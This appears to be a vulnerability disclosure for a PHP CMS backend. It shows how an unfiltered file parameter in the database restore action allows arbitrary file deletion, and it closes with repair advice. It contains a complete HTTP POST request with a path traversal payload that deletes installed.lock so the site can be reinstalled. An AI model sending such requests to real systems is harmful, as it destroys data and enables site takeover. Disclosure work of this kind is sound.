| Vulnerable file: \protected\controller\backend\database\_controller.php It can be clearly seen that $file is not security filtered Vulnerable code： .................................................... [image](https://user-images.githubusercontent.com/90141086/159718097-6dbba910-c999-4758-b2ad-3035297b0de5.png)  ..................................................  Vulnerability to reproduce: 1、First log in to the background to get the cookie  2、Here I delete the installed.lock file to verify the existence of the vulnerability, the construction package is as follows:  POST /index.php?m=backend&c=database&a=restore&step=delete HTTP/1.1 Host: [www.xxx.com](http://www.xxx.com) User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Referer: <http://www.xiaodi.com/index.php?m=backend&c=database&a=restore> Cookie: VDSSKEY=d6123bedd1b697a783c9da6f0b92254c DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 42  file%5B%5D=../../../install/installed.lock  3、Click to send the data package, you can see that the file was deleted successfully [image](https://user-images.githubusercontent.com/90141086/159714294-7881f591-14d7-4a4a-9ec1-2e7522e9003b.png)  4、It can be seen that when the installed.lock file exists, when visiting <http://xxx/install>, the page will directly jump to the front home page [image](https://user-images.githubusercontent.com/90141086/159714437-d584c580-4580-4ae3-89f7-821da525bc53.png)  So as long as we delete the installed.lock file, we can reinstall the system，When we delete the installed.lock file and visit <http://x.x.x/install>, we will enter the installation wizard page [image](https://user-images.githubusercontent.com/90141086/159715033-a1925083-2b2e-4e85-9374-7990f0612a83.png)  Repair suggestion:  1、Filter ../ or ..\ in the file variable 2、Limit the scope of deleted files or directories |
